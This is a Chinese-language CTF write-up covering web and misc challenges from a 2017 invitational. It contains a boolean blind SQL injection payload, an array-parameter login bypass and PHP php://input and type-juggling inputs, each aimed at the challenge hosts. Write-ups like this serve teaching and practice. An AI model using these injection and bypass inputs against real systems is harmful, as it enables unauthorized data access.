---
title: 第二届美亚柏科邀请赛
date: 2017-12-23 20:36:25
description: 盲注点隐藏的挺好
---

### WEB

#### WEB2

> Flag在哪里?
>
> 链    接 http://10sBB7f7sSo9.isec.anscen.cn

burp抓包后向login.php常规 post `user[]=admin&pass[]=a&submit=submit`  。 得到`flag{7538a033d41f442cbae9578d4c189615}`  。

#### WEB4

> 你找得到Flag吗？
>
> 链    接http://3jhg9aks3.isec.anscen.cn

- fuzz发现某些响应包头部会多出`Set-Cookie: remind=U1FMSQ%3D%3D;` 字样，依此进行布尔型盲注。
- 使用intruder的`Cluster Bomb` 模式自动化，攻击向量为`content=b'||substr((select/**/hex(database())),$1$,1)='$6$'#` 
- 处理得到flag

```python
r='p'+'x'*100
r=[i for i in r]

c0=[32,42]# 表示数据的第32，42位是'0'
c1=[6,18,30,70,72,76]
c2=[40,60]
c3=[11,15,21,23,25,31,33,35,37,38,41,43,45,49,51,54,57,61,65,67,73,74,75]
c4=[14,20,56]
c5=[16,28,36,46,48,68]
c6=[1,2,3,5,7,13,17,19,22,27,29,39,44,47,53,55,59,63,64,69,71]
c7=[8,9,12,24,52,62,77]
c8=[26,50,58]
c9=[34,66]
ca=[]
cb=[10]# 表示数据的第10位是'b'
cc=[4]
cd=[78]
ce=[]
cf=[]

call=[c0,c1,c2,c3,c4,c5,c6,c7,c8,c9,ca,cb,cc,cd,ce,cf]
for i in xrange(len(call)):
	for j in call[i]:
		r[j]=hex(i)[2:]
print ''.join(r)
#666c61677b3764356164363738656130393533623036356538376364386237663935616133317d
#flag{7d5ad678ea0953b065e87cd8b7f95aa31}
```

* 题外话：使用hex()编码待查询数据再进行注入会把数据长度增长一倍，但待选字符集大小将减少到十六个，对于像本题这样没法二分的情况很高效。对于可以二分查找的情况复杂度和直接注入是一样的，还可以避开不可见字符的干扰。

#### WEB5

> 还没找到flag么
>
> 链	接http://8ah3ka0akj.isec.anscen.cn

查看源码，循序渐进。

```php
view-source://http://8ah3ka0akj.isec.anscen.cn/?key1=php://input&key2=skwerl11&key3=665.99999999999999&key4=99999999999999999999999999999999999999
post Hello hacker!
-----------------------------------------------------------------------
Hello hacker! Do you want the flag?<br>
<!--
	$k1=$_GET['key1'];
	$k2=$_GET['key2'];
	if(file_get_contents($k1)==="Hello hacker!"){
		echo 'welcome! Hacker!<br>';
	}
-->sjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
welcome! Hacker!<br><!--
		if(md5($k2)>666666*666666)
		{
			include('ctf.php'); 
		}
-->
Come on, flag is coming<br>flag{0fd14555a5d275b253aff1bae158ca7c}<!--
		$k3=$_GET['key3'];
		$k4=$_GET['key4'];
		if(intval($k3)<666)
		{
			if($k3==666)
			{
				echo 'Come on, flag is coming<br>';
				if($k4>0)
				{
					if(intval($k3+$k4)<666)
						echo $flag;
				}
			}
		}
-->

```

### MISC

#### MISC4

> 到底什么才是打开flag的正确姿势？
>
> 链    接http://1e3g6S39v5M9.isec.anscen.cn

解压`Misc_Flow.rar` 得到`flag.rar` 和`Hints.txt` 两个文件，其中`hint.txt` 提示`Blasting code???No No No!There is another txt file.` ，尝试用`alternatestreamview.exe` 扫描文件夹，得到隐藏的流文件`:password.txt:$DATA` ，提取出内容是`c1d6159d94cc00dfeafde4f5ff7639ade491f7639ade4f5ff7639ade491feaf5ff7639ad` 。

发现`flag.rar` 无法作为压缩包打开，修复文件头为正确的`52617221` 后将上面字符串作为密码即可打开，得到包含flag的图片。`flag{43cca4b3de2097b9558efefb0ecc3588}` 

#### MISC5

> 截获了一份敌军的流量包，据悉暗号就在里面
>
> 链    接http://2S8h7F84v4M0.isec.anscen.cn

过滤出ICMP包，按顺序排列，发现数据包长度可疑。

```python
a=[144,150,139,145,165,91,109,151,122,113,106,119,93,167]
print ''.join([chr(i-42) for i in a])
# flag{1CmPG@M3}
```
#### MISC?

> can't see anything
>
> 什么也看不见

感谢川大师傅提供思路。

```python
题图末尾有base32字符串
KA2DAMBQGAYDATRVGAYDCMBQGAYTAMBQGAYDAMBQGA3DANJQJ42DANJRGAZVCUZSHA4DSNKPGAYTCU2SGEYDGUKTGI4DQOJVJ4YDCMKTKIYTAM2RKMZDQOBRHEZTAOBUKAZTAMBYGEYDAMJQGAYDAMBQGAYDAMBQGAZDAMCOGA2DOOBXGQ3VEMRXGYYTMUBWGY3DAMBQGAYDAMBQGAYDAMBQGAYDEMBQGAYDAMBQGAYDAMBQGAYDIMRQGA4DAMBQGAYDAMBWGIYDAMBQGAYDMMSPGJHE6OCRHA2E6NBRGNITOOJVGAYDQMBQGA4TAMBQGQYTAMCTGEZDAMJQJ42DANJRGBHDMUJQKE4FCMBTHEZDSMRVGM2VAMBSGVIFAM2RGM4VANCQHAZE6MZQGUZVENCRGRHDINJTG4ZTIM2SGQ3DGMJTGQZVCNCQGQ3U6NRTKNHFANBZGRHVATZUGQ3TQNZUG5JDENZWGE3FANRWGYYDAMBQGAYDQMBQGAYDAMBQGYZDAMBQGAYDANRSJ4ZE4TZYKE4DITZUGEZVCNZZGUYDAOBQGAYDAMBQGA2DCNBQGMYE6NBQGU======
解码后得到
P4000000N500100010000000006050O405103QS28895O011SR103QS28895O011SR103QS288193084P30081001000000000000200N0478747R27616P6660000000000000002000000000000004200800000006200000062O2NO8Q84O413Q79500800090004100S12010O40510N6Q0Q8Q039292535P025PP3Q39P4P82O3053R4Q4N4537343R4631343Q4P47O63SNP494OPO4478747R27616P666000000800000006200000062O2NO8Q84O413Q7950080000000414030O405
将NOPQRS依次替换为ABCDEF得到十六进制串
C4000000A500100010000000006050B405103DF28895B011FE103DF28895B011FE103DF288193084C30081001000000000000200A0478747E27616C6660000000000000002000000000000004200800000006200000062B2AB8D84B413D79500800090004100F12010B40510A6D0D8D039292535C025CC3D39C4C82B3053E4D4A4537343E4631343D4C47B63FAC494BCB4478747E27616C666000000800000006200000062B2AB8D84B413D7950080000000414030B405
将字符串反序，得到504B开头的字符串
504B0304140000000800597D314B48D8BA2B260000002600000008000000666C61672E7478744BCB494CAF36B74C4D3431364E3437354A4D4E3503B28C4C93D3CC520C535292930D8D0D6A01504B01021F00140009000800597D314B48D8BA2B2600000026000000080024000000000000002000000000000000666C61672E7478740A00200000000000010018003C480391882FD301EF110B59882FD301EF110B59882FD301504B050600000000010001005A0000004C
使用十六进制编辑器保存为rar文件
打开可见flag.txt文件
flag{79ea433a752ece633a25cf6d1ddcc130}
```

